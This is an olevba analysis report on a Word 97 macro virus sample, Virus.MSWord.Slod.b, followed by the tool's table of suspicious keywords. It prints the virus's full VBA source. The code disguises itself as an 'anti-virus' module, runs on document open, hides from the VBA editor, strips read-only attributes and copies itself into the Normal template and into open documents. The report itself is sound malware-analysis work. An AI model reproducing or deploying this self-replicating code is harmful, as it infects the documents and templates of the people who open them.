olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Slod.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Slod.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'======================================='
'] Lys Kovick's Anti-Virus For Word 97 ['
'] -DO NOT EDIT OR DELETE THIS MODULE- ['
'======================================='
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
Options.ConfirmConversions = Yes
Options.SaveNormalPrompt = Yes
Options.VirusProtection = Yes
If Application.VBE.MainWindow.Visible = True Then End
TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 1 Then NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 1 Then AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If NT <> TD Then
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then
SetAttr NormalTemplate.FullName, vbNormal
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString TD
NormalTemplate.Saved = True
Else
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString TD
End If
End If
If AD <> TD Then
If ActiveDocument.ReadOnly = True Then
SetAttr ActiveDocument.FullName, vbNormal
ActiveDocument.Reload
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString TD
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
SetAttr ActiveDocument.FullName, vbReadOnly
ActiveDocument.Reload
Else
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString TD
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

